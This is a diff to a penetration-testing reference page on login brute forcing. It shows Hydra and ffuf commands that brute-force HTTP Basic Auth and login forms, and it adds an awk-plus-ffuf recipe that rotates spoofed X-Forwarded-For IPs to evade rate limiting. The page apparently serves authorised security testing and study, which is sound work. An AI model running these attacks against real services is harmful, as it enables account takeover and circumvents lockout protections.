@@ -1,6 +1,6 @@
 ---
 title: "Login Brute Forcing"
-sidebarTitle: "Login brute forcing"
+sidebarTitle: "Login Brute Forcing"
 description: "Network service and web login form brute forcing with Hydra, NetExec, ffuf, CeWL, and username-anarchy."
 keywords: ["login brute forcing", "hydra", "http-post-form", "basic auth", "cewl", "username-anarchy", "password spraying", "csrf login"]
 boost: 2
@@ -79,12 +79,12 @@ hashcat --force cewl_words.txt -r /usr/share/hashcat/rules/best64.rule --stdout 
 ### HTTP Basic / Digest Authentication
 
 ```bash
-# Hydra http-get against Basic Auth endpoint
-hydra -L users.txt -P pass.txt -u TARGET_IP -s PORT http-get /admin/
+# Hydra http-get against Basic Auth endpoint (use -s for non-default HTTP port)
+hydra -L users.txt -P pass.txt -u TARGET_IP -s 8080 http-get /admin/
 
 # ffuf Basic Auth using base64-encoded user:pass pairs
 ffuf -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt:FUZZ \
-  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64 -fc 401
+  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64encode -fc 401
 ```
 
 - `-u` in Hydra iterates through users before moving to the next password (lockout-safer).
@@ -137,12 +137,16 @@ with open("passwords.txt") as f:
 
 ### Bypassing Weak IP Rate Limiting via Spoofed Headers
 
-If the application blocks your IP after N failed attempts, check whether it trusts proxy forwarding headers by rotating `X-Forwarded-For`, `X-Real-IP`, or `Client-IP`:
+If the application blocks your IP after N failed attempts, check whether it trusts proxy forwarding headers (`X-Forwarded-For`, `X-Real-IP`, or `Client-IP`) by pairing each password attempt with a distinct spoofed IP in `pitchfork` mode (or `127.0.0.1` if localhost is allowlisted):
 
 ```bash
-ffuf -w pass.txt:PASS -u http://TARGET_IP/login.php -X POST \
+# Generate one spoofed IP per password line, then step through both wordlists in lockstep
+awk '{printf "10.%d.%d.%d\n", int(NR/65025)%255, int(NR/255)%255, NR%254+1}' pass.txt > ips.txt
+
+ffuf -mode pitchfork -w pass.txt:PASS -w ips.txt:CLIENT_IP \
+  -u http://TARGET_IP/login.php -X POST \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'X-Forwarded-For: 127.0.0.1' \
+  -H 'X-Forwarded-For: CLIENT_IP' \
   -d 'username=admin&password=PASS' -fr 'Invalid'
 ```
 
